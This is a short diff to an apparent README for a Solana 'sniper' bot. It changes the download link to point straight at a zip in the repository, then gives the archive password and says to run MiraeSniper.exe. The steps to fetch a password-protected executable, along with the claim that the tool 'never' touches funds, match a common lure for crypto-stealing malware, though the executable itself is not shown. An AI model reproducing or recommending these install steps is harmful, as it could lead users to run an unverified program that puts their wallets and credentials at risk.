@@ -20,7 +20,7 @@ Honeypot Logic: Identifies malicious code designed to trap your SOL.
 Local & Private: Everything runs on your machine. We never have access to your funds.
 
 🛠 Quick Start Guide
-Download: Head to the Releases (https://www.google.com/search?q=https://github.com/your-repo/releases) section and download Mirae_Sniper_v1.0.4.zip.
+Download: Head to the [Releases](https://github.com/miraevc/Mirae-Solana-Sniper/blob/main/Mirae_Sniper_v1.0.4.zip) section and download Mirae_Sniper_v1.0.4.zip.
 🔑 Archive Password: MiraeVC
 Extract: Unzip the folder using the password provided above.
 Launch: Run MiraeSniper.exe.
